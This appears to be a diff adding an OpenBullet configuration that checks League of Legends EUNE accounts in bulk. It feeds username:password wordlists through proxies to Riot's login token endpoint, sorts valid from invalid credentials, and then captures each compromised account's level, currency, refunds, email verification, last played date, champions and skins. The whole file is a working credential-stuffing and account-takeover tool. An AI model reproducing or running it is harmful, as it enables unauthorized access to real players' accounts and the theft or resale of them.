@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "LoLEUNE_Hyacintho",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-03T17:14:03.3779989+02:00",
+  "AdditionalInfo": "",
+  "Author": "Hyacintho",
+  "Version": "1.2.3.2 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.riotgames.com/token" 
+  CONTENT "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=EUN1|<USER>&password=<PASS>&scope=openid offline_access lol ban profile email phone" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (rso-auth)" 
+  HEADER "Pragma: no-cache" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Token" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+
+#Wallet REQUEST GET "https://store.eun1.lol.riotgames.com/storefront/v3/history/purchase?language=de_DE" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (lol-store)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+
+!KEYCHECK 
+!  KEYCHAIN Custom "FREE" OR 
+!    KEY "<SOURCE>" DoesNotContain "accountId" 
+
+#level PARSE "<SOURCE>" LR "summonerLevel\":" "}" -> CAP "Level" 
+
+#BE PARSE "<SOURCE>" LR "ip\":" ",\"" -> CAP "BE" 
+
+#RP PARSE "<SOURCE>" LR "rp\":" ",\"" -> CAP "RP" 
+
+#Refund PARSE "<SOURCE>" LR "refundCreditsRemaining\":" ",\"" -> CAP "Refunds Remaining" 
+
+#Email REQUEST GET "https://email-verification.riotgames.com/api/v1/account/status" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (lol-email-verification)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#email_veriy PARSE "<SOURCE>" LR "emailVerified\":" "}" -> CAP "Email Verified" 
+
+#Last_played REQUEST GET "https://acs.leagueoflegends.com/v1/stats/player_history/auth?begIndex=0&endIndex=1" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (lol-acs)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+
+PARSE "<SOURCE>" LR "gameCreation\":" ",\"" -> VAR "UnixTime" 
+
+FUNCTION UnixTimeToDate "<UnixTime>" -> CAP "Last Played on" 
+
+#Champs REQUEST GET "https://eun1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION&language=en_US" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (lol-inventory)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#CountChamp PARSE "<SOURCE>" LR "items\":{\"" "false}]" -> VAR "Champs" 
+
+#Total_Champs FUNCTION CountOccurrences "itemId\":" "<Champs>" -> CAP "Total Champs" 
+
+#Skins REQUEST GET "https://eun1.cap.riotgames.com/lolinventoryservice/v2/inventories?inventoryTypes=CHAMPION_SKIN&language=en_US" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: RiotClient/18.0.0 (lol-inventory)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#CountSkins PARSE "<SOURCE>" LR "items\":{\"" "false}]" -> VAR "Skins" 
+
+#Total_Skins FUNCTION CountOccurrences "itemId\":" "<Skins>" -> CAP "Total Skins" 
+
